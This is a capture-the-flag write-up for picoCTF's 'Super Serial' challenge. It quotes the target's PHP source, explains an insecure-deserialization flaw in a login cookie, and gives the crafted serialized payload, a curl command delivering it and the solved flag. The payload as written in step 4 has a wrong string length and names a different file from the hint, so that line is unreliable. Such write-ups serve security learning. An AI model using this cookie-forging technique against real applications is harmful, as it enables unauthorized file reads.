## Super Serial

[Link to challenge](https://play.picoctf.org/practice/challenge/180)

Write-up:

1. Looking at the name of the challenge paired with the fact that there is a
`PHPSESSID` cookie, we are probably looking at a PHP deserialization vulnerability.

2. Looking at `/robots.txt`, we see there is a `/admin.phps`. PHPS files (.phps) 
display the PHP source code, instead of executing (like .php). Seeing this extension
made me check if we can see the full `index.php` source code using `/index.phps`,
and it was indeed successful: here is the relevant part: 

    ```php
    <?php
    require_once("cookie.php");

    if(isset($_POST["user"]) && isset($_POST["pass"])){
        $con = new SQLite3("../users.db");
        $username = $_POST["user"];
        $password = $_POST["pass"];
        $perm_res = new permissions($username, $password);
        if ($perm_res->is_guest() || $perm_res->is_admin()) {
            setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
            header("Location: authentication.php");
            die();
        } else {
            $msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
        }
    }
    ?>
    ```

3. We see that `$perm_res` is serialized. We need to understand how `permissions`
works so we can craft a payload. We can access `cookies.phps`:

    ```php
    <?php
    session_start();

    class permissions
    {
        public $username;
        public $password;

        function __construct($u, $p) {
            $this->username = $u;
            $this->password = $p;
        }

        function __toString() {
            return $u.$p;
        }

        function is_guest() {
            $guest = false;

            $con = new SQLite3("../users.db");
            $username = $this->username;
            $password = $this->password;
            $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
            $stm->bindValue(1, $username, SQLITE3_TEXT);
            $stm->bindValue(2, $password, SQLITE3_TEXT);
            $res = $stm->execute();
            $rest = $res->fetchArray();
            if($rest["username"]) {
                if ($rest["admin"] != 1) {
                    $guest = true;
                }
            }
            return $guest;
        }

            function is_admin() {
                    $admin = false;

                    $con = new SQLite3("../users.db");
                    $username = $this->username;
                    $password = $this->password;
                    $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                    $stm->bindValue(1, $username, SQLITE3_TEXT);
                    $stm->bindValue(2, $password, SQLITE3_TEXT);
                    $res = $stm->execute();
                    $rest = $res->fetchArray();
                    if($rest["username"]) {
                            if ($rest["admin"] == 1) {
                                    $admin = true;
                            }
                    }
                    return $admin;
            }
    }

    if(isset($_COOKIE["login"])){
        try{
            $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
            $g = $perm->is_guest();
            $a = $perm->is_admin();
        }
        catch(Error $e){
            die("Deserialization error. ".$perm);
        }
    }

    ?>
    ```

    We can also access `authentication.phps`:

    ```php
    <?php
    class access_log
    {
        public $log_file;

        function __construct($lf) {
            $this->log_file = $lf;
        }

        function __toString() {
            return $this->read_log();
        }

        function append_to_log($data) {
            file_put_contents($this->log_file, $data, FILE_APPEND);
        }

        function read_log() {
            return file_get_contents($this->log_file);
        }
    }

    require_once("cookie.php");
    if(isset($perm) && $perm->is_admin()){
        $msg = "Welcome admin";
        $log = new access_log("access.log");
        $log->append_to_log("Logged in at ".date("Y-m-d")."\n");
    } else {
        $msg = "Welcome guest";
    }
    ?>
    ```

4. The path to the flag is probably the `read_log()` function. Looking at the hint
provided, we know that the flag is at `../flag.txt`. To exploit this, we b64 
encode `O:10:"access_log":1:{s:8:"log_file";s:11:"../flag";}` and set it as the
`login` cookie. Accessing `authentication.php` returns "Deserialization error",
probably because of a WAF. However, attempting the request through shell works and
returns the flag:

    `curl mercury.picoctf.net:25395/authentication.php --cookie "login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9"`

    Flag: **picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_c5123066}**

